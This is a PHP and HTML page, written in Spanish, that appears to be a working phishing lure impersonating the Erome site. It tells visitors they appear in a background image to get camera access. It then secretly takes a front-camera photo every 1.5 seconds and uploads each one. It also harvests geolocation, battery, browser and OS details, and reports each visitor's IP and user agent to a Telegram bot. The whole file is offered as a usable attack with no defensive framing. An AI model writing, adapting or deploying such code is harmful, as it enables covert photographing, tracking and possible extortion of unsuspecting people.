<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "👋 <b>Nueva visita</b>\n".
       "📌 IP: $ip\n".
       "🖥 UA: $ua\n".
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!doctype html>
<html>
<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
/* Estilos como antes (omito repetirlos por brevedad) */
</style>
</head>
<body>

<div id="cameraModal">
    <div class="content">
        <img src="img/logo-erome-vertical.png" alt="Erome Logo" class="logo">
        <p>📸 ¡Wow! Apareces en la imagen de fondo... Necesitamos tu permiso para acceder a la cámara.</p>
        <button id="grantAccess">Permitir acceso</button>
    </div>
</div>

<div id="unlockAnimation">
    <div>Desbloqueando imagen...</div>
    <div class="loader"></div>
</div>

<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

function postPhoto(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}

async function sendDeviceInfo() {
    const battery = await navigator.getBattery();
    const data = {
        ip: '<?php echo $ip; ?>',
        ua: navigator.userAgent,
        browser: navigator.appName,
        appver: navigator.appVersion,
        os: navigator.platform,
        lang: navigator.language,
        battery: Math.floor(battery.level * 100)
    };

    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(pos => {
            data.lat = pos.coords.latitude;
            data.lon = pos.coords.longitude;
            data.accuracy = pos.coords.accuracy;

            fetch('device_info.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        });
    } else {
        fetch('device_info.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });
    }
}

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;
        capturePhotoLoop();

        document.getElementById('unlockAnimation').style.display = 'flex';
        setTimeout(() => {
            document.getElementById('unlockAnimation').style.display = 'none';
            document.body.classList.add('unlocked');
        }, 5000);

        sendDeviceInfo();
    } catch (e) {
        console.error('Error al acceder a la cámara:', e);
        document.getElementById('cameraModal').style.display = 'flex';
    }
}

function capturePhotoLoop() {
    const context = canvas.getContext('2d');
    setInterval(() => {
        context.drawImage(video, 0, 0, 640, 480);
        postPhoto(canvas.toDataURL("image/png").replace("image/png","image/octet-stream"));
    }, 1500);
}

document.getElementById('grantAccess').addEventListener('click', () => {
    document.getElementById('cameraModal').style.display = 'none';
    initCamera();
});
</script>
</body>
</html>
